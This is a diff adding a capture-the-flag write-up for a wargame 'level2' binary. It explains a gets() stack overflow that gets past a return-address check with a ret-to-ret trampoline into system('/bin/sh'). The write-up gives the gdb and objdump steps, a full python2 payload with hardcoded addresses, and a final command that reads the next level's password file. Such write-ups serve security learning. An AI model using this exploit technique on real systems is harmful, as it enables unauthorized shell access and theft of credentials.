@@ -1,0 +1,42 @@
+Goal: bypass the return-address check and call `system("/bin/sh")`.
+
+Observation:
+- `p()` reads input with `gets()` into a 76-byte stack buffer.
+- It rejects return addresses in the `0xbxxxxxxx` range (stack/libc).
+- After the check, it returns normally, so only the first saved return address is checked.
+
+Method: ret-to-ret trampoline
+- First return address is a safe `ret` instruction in `.text` (starts with 0x08).
+- That `ret` immediately returns again to the next stack value, which we set to `system`.
+
+Steps:
+1) Find a safe `ret` in `.text` (end of `p()`):
+	objdump -d /home/user/level2/level2 | grep -n "ret" | head
+	(used 0x0804853e)
+2) Find `system` and the "/bin/sh" string in libc:
+	gdb -q /home/user/level2/level2
+	(gdb) run
+	(gdb) p system
+	(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
+3) Build payload (offset 80):
+	["A"*80] + [ret_text] + [system] + [fake ret] + ["/bin/sh" addr]
+4) Execute:
+	(python2 - <<'PY'
+	import struct, sys
+	offset = 80
+	ret_text = 0x0804853e
+	system = 0xb7e6b060
+	binsh  = 0xb7f8cc58
+	payload = "A"*offset
+	payload += struct.pack("<I", ret_text)
+	payload += struct.pack("<I", system)
+	payload += "AAAA"
+	payload += struct.pack("<I", binsh)
+	sys.stdout.write(payload + "\n")
+	PY
+	cat) | /home/user/level2/level2
+5) In the spawned shell:
+	cat /home/user/level3/.pass
+
+Result:
+- The command prints the level3 password, stored in the flag file.
